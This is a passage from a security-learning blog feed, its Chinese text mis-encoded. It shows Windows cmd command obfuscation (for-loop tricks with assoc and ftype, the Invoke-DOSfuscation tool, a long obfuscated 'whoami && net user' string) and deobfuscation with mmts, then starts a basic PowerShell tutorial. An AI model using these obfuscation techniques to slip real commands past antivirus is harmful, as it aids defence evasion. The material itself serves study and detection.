<h3 id="ä½¿ç”¨forå¾ªç¯æ‹¼æ¥å‘½ä»¤"><a href="#ä½¿ç”¨forå¾ªç¯æ‹¼æ¥å‘½ä»¤" class="headerlink" title="ä½¿ç”¨forå¾ªç¯æ‹¼æ¥å‘½ä»¤"></a>ä½¿ç”¨forå¾ªç¯æ‹¼æ¥å‘½ä»¤</h3><p>cmdä¸­é™¤äº†setå‘½ä»¤æ­ª è¿˜æœ‰ ftypeã€assocç­‰å‘½ä»¤</p>
<p><code>assoc</code> æ–‡ä»¶åæ‹“å±•å…³è”å‘½ä»¤ </p>
<p><code>assoc /?</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ˜¾ç¤ºæˆ–ä¿®æ”¹æ–‡ä»¶æ‰©å±•åå…³è”</span><br><span class="line"></span><br><span class="line">ASSOC [.ext[=[fileType]]]</span><br><span class="line"></span><br><span class="line">  .ext      æŒ‡å®šè·Ÿæ–‡ä»¶ç±»å‹å…³è”çš„æ–‡ä»¶æ‰©å±•å</span><br><span class="line">  fileType  æŒ‡å®šè·Ÿæ–‡ä»¶æ‰©å±•åå…³è”çš„æ–‡ä»¶ç±»å‹</span><br><span class="line"></span><br><span class="line">é”®å…¥ ASSOC è€Œä¸å¸¦å‚æ•°ï¼Œæ˜¾ç¤ºå½“å‰æ–‡ä»¶å…³è”ã€‚å¦‚æœåªç”¨æ–‡ä»¶æ‰©å±•</span><br><span class="line">åè°ƒç”¨ ASSOCï¼Œåˆ™æ˜¾ç¤ºé‚£ä¸ªæ–‡ä»¶æ‰©å±•åçš„å½“å‰æ–‡ä»¶å…³è”ã€‚å¦‚æœä¸ä¸º</span><br><span class="line">æ–‡ä»¶ç±»å‹æŒ‡å®šä»»ä½•å‚æ•°ï¼Œå‘½ä»¤ä¼šåˆ é™¤æ–‡ä»¶æ‰©å±•åçš„å…³è”ã€‚</span><br></pre></td></tr></table></figure>

<p><code>ftype /?</code> </p>
<p>ftypeï¼šæ˜¾ç¤ºæˆ–ä¿®æ”¹ç”¨åœ¨æ–‡ä»¶æ‰©å±•åå…³è”ä¸­çš„æ–‡ä»¶ç±»å‹ï¼ŒæŒ‡å®šä¸€ç§ç±»å‹çš„æ–‡ä»¶é»˜è®¤ç”¨å“ªä¸ªç¨‹åºè¿è¡Œæˆ–æ‰“å¼€ã€‚å‘½ä»¤æ ¼å¼ä¸º<code> ftype [fileType[=[openCommandString]]</code></p>
<p><img src="/posts/bac18dc8/f1.png" alt="æˆªå›¾"></p>
<br>

<p><code>for /?</code>  ä½¿ç”¨æ–¹æ³•æŒºè¯¦ç»†çš„ å°±æ˜¯æ„Ÿè§‰æœ‰ç‚¹ä¸å¥½ç†è§£â€¦</p>
<p><img src="/posts/bac18dc8/f2.png" alt="æˆªå›¾"></p>
<p>for å¾ªç¯åœ¨æ··æ·†æ—¶æ˜¯ä¸€ç§è¾ƒä¸ºå¤æ‚çš„æ–¹å¼é€šå¸¸ä¼šä½¿ç”¨  /F å’Œ /L å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR /L %variable IN (start,step,end) DO command [command-parameters]</span><br><span class="line"></span><br><span class="line">è¯¥é›†è¡¨ç¤ºä»¥å¢é‡å½¢å¼ä»å¼€å§‹åˆ°ç»“æŸçš„ä¸€ä¸ªæ•°å­—åºåˆ—ã€‚å› æ­¤ï¼Œ(1,1,5)å°†äº§ç”Ÿåºåˆ—12345ï¼Œ(5,-1,1)å°†äº§ç”Ÿåºåˆ—(54321)</span><br><span class="line"></span><br><span class="line">FOR /F [&quot;options&quot;] %variable IN (file-set) DO command [command-parameters]</span><br><span class="line">FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command [command-parameters]</span><br><span class="line">FOR /F [&quot;options&quot;] %variable IN (&#x27;command&#x27;) DO command [command-parameters]</span><br><span class="line"></span><br><span class="line">delims=xxx  ç”¨xxxè¿›è¡Œåˆ†å‰²å­—ç¬¦ä¸²</span><br><span class="line">delims=f= ç”¨fä¸= è¿›è¡Œåˆ†å‰²å­—ç¬¦ä¸²</span><br><span class="line">tokens=x,y,m-n </span><br><span class="line">tokens=2 é€‰æ‹©åˆ†å‰²åçš„ç¬¬äºŒæ®µ</span><br><span class="line">usebackq</span><br><span class="line"></span><br><span class="line">for /f &quot; delims=f= tokens=2&quot; %f IN ( &#x27;assoc .cmd&#x27; ) do %f</span><br><span class="line">assoc .cmd è¿”å›ç»“æœä¸º .cmd=cmdfile</span><br><span class="line">delims=f= ä¼šä½¿ç”¨få’Œ=è¿›è¡Œåˆ†å‰²  åˆ†æˆ3éƒ¨åˆ† .cmd cmd file</span><br><span class="line">tokens=2  ä¼šé€‰æ‹©ç¬¬äºŒéƒ¨åˆ† å³cmd </span><br><span class="line">æ‰€ä»¥è¯¥å‘½ä»¤æ‰§è¡Œåä¼šå»è°ƒç”¨cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FOR /F &quot;usebackq delims==&quot; %i IN (`set`) DO @echo %i</span><br><span class="line">ä¼šæšä¸¾å½“å‰ç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡åç§°</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="åˆ©ç”¨æ··æ·†å·¥å…·"><a href="#åˆ©ç”¨æ··æ·†å·¥å…·" class="headerlink" title="åˆ©ç”¨æ··æ·†å·¥å…·"></a>åˆ©ç”¨æ··æ·†å·¥å…·</h3><p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></p>
<p>éœ€è¦powershellç®¡ç†å‘˜æƒé™ä¸‹å»è¿è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line">Import-Module .\Invoke-DOSfuscation.psd1</span><br><span class="line">Invoke-DOSfuscation</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨<code>tutorial</code> æŸ¥çœ‹åŸºæœ¬ä½¿ç”¨æ–¹æ³•</li>
</ul>
<p><img src="/posts/bac18dc8/11.png" alt="æˆªå›¾"></p>
<ul>
<li>Set command [éœ€è¦æ··æ·†çš„å‘½ä»¤]  //è®¾ç½®éœ€è¦æ··æ·†çš„å‘½ä»¤   </li>
</ul>
<p><img src="/posts/bac18dc8/12.png" alt="æˆªå›¾"></p>
<ul>
<li>Set FINALBINARY [å‘½ä»¤è¿è¡Œçš„ç¯å¢ƒ]  //è®¾ç½®å‘½ä»¤è¿è¡Œçš„ç¯å¢ƒ</li>
</ul>
<p><img src="/posts/bac18dc8/13.png" alt="æˆªå›¾"></p>
<ul>
<li>payload  //åŠ è½½æ··æ·†æ¨¡å—</li>
</ul>
<p><img src="/posts/bac18dc8/14.png" alt="æˆªå›¾"></p>
<ul>
<li><p>show //æŸ¥çœ‹å½“å‰å‘½ä»¤è®¾ç½®çš„å‚æ•°è¯¦æƒ…</p>
<p><img src="/posts/bac18dc8/15.png"></p>
</li>
<li><p>test  //æµ‹è¯•æ··æ·†åçš„å‘½ä»¤</p>
</li>
</ul>
<br>

<h3 id="cmdå‘½ä»¤å»æ··æ·†"><a href="#cmdå‘½ä»¤å»æ··æ·†" class="headerlink" title="cmdå‘½ä»¤å»æ··æ·†"></a>cmdå‘½ä»¤å»æ··æ·†</h3><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><ul>
<li>æ›¿æ¢æ‰ ^ è½¬ä¹‰å­—ç¬¦</li>
<li>é€šè¿‡ = å’Œ % çš„è§„åˆ™å»æŸ¥æ‰¾æ··æ·†çš„å˜é‡</li>
<li>é€šè¿‡ set æŸ¥æ‰¾æ··æ·†å˜é‡</li>
<li>é€šè¿‡ %:~m,n% æŸ¥æ‰¾æ··æ·†å˜é‡</li>
<li>ç»Ÿä¸€å°å†™å¸¸ç”¨å‘½ä»¤å’Œç¨‹åºåç§°</li>
</ul>
<h4 id="mmts"><a href="#mmts" class="headerlink" title="mmts"></a>mmts</h4><p>è¿™é‡Œä½¿ç”¨mmtsç®€å•è¯•ä¸€ä¸‹ é¡¹ç›®åœ°å€ <a href="https://github.com/a232319779/mmts">https://github.com/a232319779/mmts</a></p>
<p>å…ˆé€šè¿‡åæ··æ·†å·¥å…·ç”Ÿæˆä¸€æ¡å‘½ä»¤ ä¿å­˜ä¸º1.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /C&quot;set zUG=\System32\ ^^^| findstr calc\.exe&amp;&amp;set cF=:&amp;&amp;set szG=Windows&amp;&amp;set QK=\&amp;&amp;set HhO=dir&amp;&amp;set u6= C&amp;&amp;call set uQ=%HhO%%u6%%cF%%QK%%szG%%zUG%&amp;&amp;cmd /C %uQ%&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†mmtsä¸‹ <code>mmts-decmd 1.txt</code></p>
<p><img src="/posts/bac18dc8/16.png" alt="æˆªå›¾"></p>
<p>å†å»ç”Ÿæˆä¸€ä¸ªå¤æ‚ç‚¹çš„æ··æ·† <code>whoami &amp;&amp; net user</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f^o^R  ;   ,    ;  ,  ;   ,   ,   /^F   ;   ;  ;  ;  &quot;      tokens=   +2       delims=H0lFu&quot;  ;   ,   ;   ,  ;  ;    %^V  ;   ;  ,   ,    ,  ^In    ,    ;  ;  ;  (   ,  ,    ,   ,    ;    ;   ,   &#x27;   ,  ;    ,  ,    ;    ,   ;  ^^f^^t^^Y^^P^^E  ;   ;  ;    ;   ^|    ;   ,   ;    ;  ^^f^^iN^^D   ;   ;    ,    ;    ;  ,  ,  &quot;Cm&quot;   ;  ,   ,  ,  ;    ,  &#x27;  ,   ;  ,   ;   )  ;  ,   ;   ;   ,   ^D^o   ;   ;  ,    %^V,     ;   ;  ;  ;  ,  ,   ;  9k467c^/^v^@^E^O^f^ ^ ^    ;  ;   ;    ;  kwp3a/^r       &quot;  ;  ;    ,   ,  ,  (       ,      ,    ,     ,     ,       (     ,    (^S^e^t ^  ^ ^*^_;=^~^R^-^j^z^ri^2^S^U^&amp;e_^y^6^a^&gt;^s^aY^6vh^u^Z^d^L^+N^ ^#^k^6`Ut^p ^4^c^H^e^,^jo^Y&#125;n^-^`^5^9^_^ ^1^Z^)^, ^&amp;^]^2^;^e^t^^?^eO^&amp;^#^&amp;^,^K^Y^BN^^3%^D^I^w^ 1^l^H^3P^i~^f^b%;^m^(^f^o^@^)a^g^&#123;^c^s^K^o^_C^&#123;^E^`^h^p^F^@^BAwp^Qd^B^?^ ^x^qs^zl^ ^Vq^&gt;^Y^j^|^f^&#123;^5S^Z^^O^)^6^?^\^ ^6^&lt;%^v^2\a^?^j^z^G^2^&amp;^W^S^9^a^3^`^*^&gt;v^w^mj~#^t^(^ea^T^h^_^6^t^aB^)^A^X^s^j^b^D^(^W^y^\^Al^:&#123;^s^C^b^\5^@^\^M^C^XN^?^s^J^M^P^[^x^w^S^4^UCy^o^I^9^&#123;^2^S^d^T^w^_^`^Xn^u^J^|r3^i~^x^&#123;^L^&amp;^w^[^r^vW^,^\^7^b^;^e^R^:^#^`=E^;^C^9^g^O^o~^ ^Z^v^&gt;^ ^A^r^Y^&#x27;^m^$^[^iZ^=^Bt^*^d) ; ; ; ; ) ; ; ; ; ; )&amp;       ;  ,    ;  ,   ,    ,  ;  ^f^o^R   ;   ;    ;    ;  ;  /^L   ,  ,   ;    %^j  ;   ,  ,    ^In    ;    ,   ;  ,  (^  ^ ^ ^ ^2^9^3^   ^ ^ ^,^ ^ ^ ^;^ ^ ^ ^ , ^    ^ ^ ^;^ ^  ^,^ ^ ^ ^   ^ ; ^ ^ ^ ^ ^  ^,^   ^ ^ ^-^6 ^ ^   ^ ^ ^,^    ^+5^ ^ ^ ^ ^ ^ )   ,    ;    ;  ;   ,   ;  ;    ^D^o  ;   ,  ,    ;   ;    ,  ,    (       ,       (      ,    ;     ,       ;     ,      ;      ,      ;      ,    (      ,      (       ,     ;    ,     ;   ,   ;       ,     ;   ,     ;      ,    ;       ,     ;   ,       (     ,       ,   ,   ,    ,      ,   ,   (    ;   ,    ;  ,  ;    ;   ^S^Et        `^&#123;^&#x27;=!`^&#123;^&#x27;!!^*^_;:~   %^j,      1!)       ,       ;     ,     ;       ,      ;     ,    ;    ,     )   ,     ,       ,     )       ,    ,   ,     ,       ,      ,       ,    )       ,     ;       ,     ;       ,      ;    ,    ;      ,      ;      ,     ;       ,       ;       ,     )     ,   ,   ,    ,      ,    )&amp;&amp;   ;    ;   ;  ,  ;    ^i^F  ,   ,    ,   ;    %^j  ;  ;    ;   ,    ^E^q^u   ,  ;  ;    ,   ^5   ,  ,    ;  (     ,     ,      ,     (     ,       ,    ,      (       ,   ;    ,      ;      ,       ;     ,       ;   ,   ;   ,      (   ,   ;    ,       ;       ,      ;       ,     ;       ,    (^e^C^h^O   ;   ,   ;    ;  !`^&#123;^&#x27;:^*^`^&#123;&#x27;!^=!       |  ,  ,    ,   ;  ^F^O^r   ;   ,  ,   ;    /^f   ;    ,    ;    &quot;^ ^ ^ ^ ^ ^ ^ t^ok^en^s= ^ ^ ^ ^ ^ ^ ^+^2^ ^ ^ ^ ^de^li^m^s^=^M^Hc^L^F^e&quot;   ,  ,    ,   ;   ,   %^D    ;   ,   ,   ^iN  ;   ;  ,    ;   ;    ;   ;   (    ,  ,   ,   ,   ,  ,   &#x27;  ,   ,   ;   ,    ,   ,    ;    f^^^^T^^^^y^^^^Pe   ,   ;    ,   ;   ;   ,   ,  ^^^|  ,  ;  ,   ;   ,  ,   ^^^^F^^^^In^^^^D  ;   ,  ;    ;  &quot;Cm&quot;  ;   ,  ,   ;   ,  &#x27;  ;  ,    ;    ;    ;   ,  )   ;   ;   ;    ^d^o    ,  ;  ;  %^D, )    ,      ,    )      ,    ,    )    ;     ;       ;    ;       ;   )      )   ;  ,  ;    ;    ;  ;    ;  &quot;</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä½¿ç”¨reverse çš„é«˜çº§æ··æ·†ï¼Œä½†æ˜¯mmtsä¹Ÿæ²¡ç”¨æŠŠä»–å½»åº•è§£å‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R  ;   ,    ;  ,  ;   ,   ,   /F   ;   ;  ;  ;  &quot;      tokens=   +2       delims=H0lFu&quot;  ;   ,   ;   ,  ;  ;    %V  ;   ;  ,   ,    ,  In    ,    ;  ;  ;  (   ,  ,    ,   ,    ;    ;   ,   &#x27;   ,  ;    ,  ,    ;    ,   ;  ftYPE  ;   ;  ;    ;   |    ;   ,   ;    ;  fiND   ;   ;    ,    ;    ;  ,  ,  &quot;Cm&quot;   ;  ,   ,  ,  ;    ,  &#x27;  ,   ;  ,   ;   )  ;  ,   ;   ;   ,   Do   ;   ;  ,    %V,     ;   ;  ;  ;  ,  ,   ;  9k467c/v@EOf      ;  ;   ;    ;  kwp3a/r       &quot;  ;  ;    ,   ,  ,  (       ,      ,    ,     ,     ,       (     ,    (e_y6a&gt;saY6vhuZdL+N #k6`Utp 4cHe,joY&#125;n-`59_ 1Z), &amp;]2;et?eO&amp;#&amp;,KYBN3%DIw 1lH3Pi~fb%;m(fo@)ag&#123;csKo_C&#123;E`hpF@BAwpQdB? xqszl Vq&gt;Yj|f&#123;5SZO)6?\ 6&lt;%v2\a?jzG2&amp;WS9a3`*&gt;vwmj~#t(eaTh_6taB)AXsjbD(Wy\Al:&#123;sCb\5@\MCXN?sJMP[xwS4UCyoI9&#123;2SdTw_`XnuJ|r3i~x&#123;L&amp;w[rvW,\7b;eR:#`=E;C9gOo~ Zv&gt; ArY&#x27;m$[iZ=Bt*d) ; ; ; ; ) ; ; ; ; ; )&amp;       ;  ,    ;  ,   ,    ,  ;  foR   ;   ;    ;    ;  ;  /L   ,  ,   ;    %j  ;   ,  ,    In    ;    ,   ;  ,  (     293     ,   ;    ,       ;   ,       ;       ,     -6       ,    +5      )   ,    ;    ;  ;   ,   ;  ;    Do  ;   ,  ,    ;   ;    ,  ,    (       ,       (      ,    ;     ,       ;     ,      ;      ,      ;      ,    (      ,      (       ,     ;    ,     ;   ,   ;       ,     ;   ,     ;      ,    ;       ,     ;   ,       (     ,       ,   ,   ,    ,      ,   ,   (    ;   ,    ;  ,  ;    ;      ;    ;   ;  ,  ;    iF  ,   ,    ,   ;    %j  ;  ;    ;   ,    Equ   ,  ;  ;    ,   5   ,  ,    ;  (     ,     ,      ,     (     ,       ,    ,      (       ,   ;    ,      ;      ,       ;     ,       ;   ,   ;   ,      (   ,   ;    ,       ;       ,      ;       ,     ;       ,    (echo   ;   ,   ;    ;  !`&#123;&#x27;:*`&#123;&#x27;!=!       |  ,  ,    ,   ;  FOr   ;   ,  ,   ;    /f   ;    ,    ;    &quot;       tokens=       +2    delims=MHcLFe&quot;   ,  ,    ,   ;   ,   %D    ;   ,   ,   iN  ;   ;  ,    ;   ;    ;   ;   (    ,  ,   ,   ,   ,  ,   &#x27;  ,   ,   ;   ,    ,   ,    ;    fTyPe   ,   ;    ,   ;   ;   ,   ,  |  ,  ;  ,   ;   ,  ,   FInD  ;   ,  ;    ;  &quot;Cm&quot;  ;   ,  ,   ;   ,  &#x27;  ;  ,    ;    ;    ;   ,  )   ;   ;   ;    do    ,  ;  ;  %D, )    ,      ,    )      ,    ,    )    ;     ;       ;    ;       ;   )      )   ;  ,  ;    ;    ;  ;    ;  &quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/17.png" alt="æˆªå›¾"></p>
<p>å·¦ä¾§ä¸ºæ··æ·†åï¼Œå³ä¾§ä¸ºä½¿ç”¨mmtså»æ··æ·†åçš„ç»“æœ</p>
<p>ç›´æ¥ä½¿ç”¨psè„šæœ¬çš„ test åŠŸèƒ½ ç«ç»’éƒ½ä¼šæŠ¥é”™ï¼Œå¾ˆæ˜¾ç„¶å•å•è¿™ä¸€æŠ€æœ¯ç°åœ¨å·²ç»ä¸å¯è¡Œï¼Œè¿™é‡Œä¸»è¦æ˜¯å­¦ä¹ ä¸€ä¸‹æ€è·¯</p>
<p><img src="/posts/bac18dc8/18.png" alt="æˆªå›¾"></p>
<p><img src="/posts/bac18dc8/19.png" alt="æˆªå›¾"></p>
<br>



<p>è™½ç„¶ç°åœ¨æ¥è¯´å¯èƒ½æ²¡æ³•å»ç»•è¿‡æ€è½¯äº†ï¼ˆå¤§å¤šæ€è½¯éƒ½æ˜¯ä»åº•å±‚é˜²å¾¡ï¼‰ï¼Œä½†æ˜¯è¿˜ç®—æ˜¯ä¸€ç§æ€è·¯</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://www.anquanke.com/post/id/260422">https://www.anquanke.com/post/id/260422</a><br><a href="https://www.cnblogs.com/nongchaoer/p/13054822.html">https://www.cnblogs.com/nongchaoer/p/13054822.html</a><br><a href="https://www.t00ls.cc/articles-54517.html">https://www.t00ls.cc/articles-54517.html</a><br><a href="https://cloud.tencent.com/developer/article/1633973">https://cloud.tencent.com/developer/article/1633973</a><br><a href="https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86">https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>PowershellåŸºç¡€å­¦ä¹ </title>
    <url>/posts/359bf983/</url>
    <content><![CDATA[<h3 id="PowershellåŸºç¡€"><a href="#PowershellåŸºç¡€" class="headerlink" title="PowershellåŸºç¡€"></a>PowershellåŸºç¡€</h3><h4 id="0x00-æ‰§è¡Œç­–ç•¥-amp-ç‰ˆæœ¬ä¿¡æ¯"><a href="#0x00-æ‰§è¡Œç­–ç•¥-amp-ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="0x00 æ‰§è¡Œç­–ç•¥&amp; ç‰ˆæœ¬ä¿¡æ¯"></a>0x00 æ‰§è¡Œç­–ç•¥&amp; ç‰ˆæœ¬ä¿¡æ¯</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span></span><br><span class="line"></span><br><span class="line">Restrictedï¼šè„šæœ¬ä¸èƒ½è¿è¡Œ</span><br><span class="line">RemoteSignedï¼šåœ¨æœ¬åœ°åˆ›å»ºçš„è„šæœ¬å¯ä»¥è¿è¡Œï¼Œä½†ä»ç½‘ä¸Šä¸‹è½½çš„è„šæœ¬ä¸èƒ½è¿è¡Œï¼ˆæ‹¥æœ‰æ•°å­—è¯ä¹¦ç­¾åçš„é™¤å¤–ï¼‰ã€‚</span><br><span class="line">AllSignedï¼šä»…å½“å‰è„šæœ¬å—ä¿¡ä»»çš„å‘å¸ƒè€…ç­¾åæ—¶æ‰èƒ½è¿è¡Œã€‚</span><br><span class="line">Unrestrictedï¼šå…è®¸æ‰€æœ‰è„šæœ¬è¿è¡Œ</span><br></pre></td></tr></table></figure>

<ul>
<li>1.0 - windows server 2008</li>
<li>2.0 - windows server 2008 r2ã€windows 7</li>
<li>3.0 - windows server 2012ã€windows 8</li>
<li>4.0 - windows server 2012 r2ã€windows 8.1</li>
<li>5.0 - windows 10</li>
<li>5.1 - windows server 2016</li>
</ul>
<br>

<h4 id="0x01-åŸºæœ¬è¯­æ³•"><a href="#0x01-åŸºæœ¬è¯­æ³•" class="headerlink" title="0x01 åŸºæœ¬è¯­æ³•"></a>0x01 åŸºæœ¬è¯­æ³•</h4><ul>
<li>å¯¹ç¼©è¿›ä¸æ•æ„Ÿ</li>
<li>ä¸å¼ºåˆ¶åˆ†å·</li>
<li>ä¿ç•™å­—ã€å‘½ä»¤å¤§å°å†™åŒºåˆ†</li>
<li>ä»¥{}ä½œä¸ºä»£ç å—</li>
</ul>
<h4 id="0x02-å˜é‡"><a href="#0x02-å˜é‡" class="headerlink" title="0x02.å˜é‡"></a>0x02.å˜é‡</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># å…¨å±€å˜é‡</span></span><br><span class="line"><span class="variable">$global:a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># è„šæœ¬å˜é‡</span></span><br><span class="line"><span class="variable">$script:a</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºå˜é‡a</span></span><br><span class="line"><span class="built_in">Write-host</span> <span class="variable">$a</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># åˆ é™¤å˜é‡</span></span><br><span class="line"><span class="built_in">clear-variable</span></span><br><span class="line"><span class="comment"># æŸ¥çœ‹açš„ç±»å‹</span></span><br><span class="line"><span class="variable">$a</span>.GetType()</span><br></pre></td></tr></table></figure>

<h4 id="0x03-å¯¹è±¡é›†åˆ"><a href="#0x03-å¯¹è±¡é›†åˆ" class="headerlink" title="0x03 å¯¹è±¡é›†åˆ"></a>0x03 å¯¹è±¡é›†åˆ</h4><h5 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åˆ›å»ºå’Œåˆå§‹åŒ–æ•°ç»„</span><br><span class="line">$arr = 1,2,3,4,5</span><br><span class="line">$arr2 = 1..5</span><br><span class="line"></span><br><span class="line">$arr[0]</span><br><span class="line">$arr2[2..5]</span><br><span class="line"></span><br><span class="line"># æ•°ç»„å¤§å°</span><br><span class="line">$arr.Length</span><br><span class="line"></span><br><span class="line">#æ•°ç»„æ“ä½œ</span><br><span class="line">$arr[2] = 8</span><br><span class="line"># å°†å…ƒç´ æ·»åŠ åˆ°$arrä¸­ </span><br><span class="line">$arr += 6</span><br><span class="line"></span><br><span class="line"># åˆå§‹åŒ–ä¸€ä¸ªç©ºæ•°ç»„</span><br><span class="line">$arr = @()</span><br><span class="line"></span><br><span class="line"># ä»æ•°ç»„ä¸­åˆ é™¤å…ƒç´ </span><br><span class="line">$arr = 1..5</span><br><span class="line">$arr = ($arr[1], $arr[2], $arr[3])</span><br></pre></td></tr></table></figure>

<br>

<h5 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;&lt;key1&gt; = &lt;value1&gt; ; &lt; key2&gt; = &lt;value2&gt; ; ..... ; &lt; keyN&gt; = &lt;valueN&gt;;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;a = <span class="number">1</span>; a2 = <span class="number">2</span> ;&#125;</span><br><span class="line"><span class="variable">$dict</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name                           Value                                                                      </span></span><br><span class="line"><span class="comment"># ----                           -----                                                                      </span></span><br><span class="line"><span class="comment"># a                              1                                                                          </span></span><br><span class="line"><span class="comment"># a2                             2   </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.Keys</span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.values</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå“ˆå¸Œè¡¨çš„é”®/å€¼å¯¹æ€»æ•°</span></span><br><span class="line"><span class="variable">$dict</span>.count</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.</span><br><span class="line"><span class="variable">$dict</span>.Add(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="variable">$dict</span>.Remove(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hash</span> = <span class="selector-tag">@</span>&#123; ID = <span class="number">1</span>; Shape = <span class="string">&quot;Square&quot;</span>; Color = <span class="string">&quot;Blue&quot;</span>&#125;</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable keys&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.keys</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable values&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.values</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get ID&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;ID&quot;</span>]</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get Shape&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Number</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;Updated&quot;</span>] = <span class="string">&quot;Now&quot;</span></span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Add(<span class="string">&quot;Created&quot;</span>,<span class="string">&quot;Now&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Remove key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Remove(<span class="string">&quot;Updated&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;sort by key&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.GetEnumerator() | <span class="built_in">Sort-Object</span> <span class="literal">-Property</span> key</span><br><span class="line"></span><br><span class="line"><span class="literal">-----------------</span></span><br><span class="line">Print all hashtable keys</span><br><span class="line">Color</span><br><span class="line">Shape</span><br><span class="line">ID</span><br><span class="line">Print all hashtable values</span><br><span class="line">Blue</span><br><span class="line">Square</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get ID</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get Shape</span><br><span class="line">print Size</span><br><span class="line"><span class="number">3</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">5</span></span><br><span class="line">Remove key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="built_in">sort</span> by key</span><br><span class="line">Name Value</span><br><span class="line"><span class="literal">----</span> <span class="literal">-----</span></span><br><span class="line">Color Blue</span><br><span class="line">Created Now</span><br><span class="line">ID <span class="number">1</span></span><br><span class="line">Shape Square</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

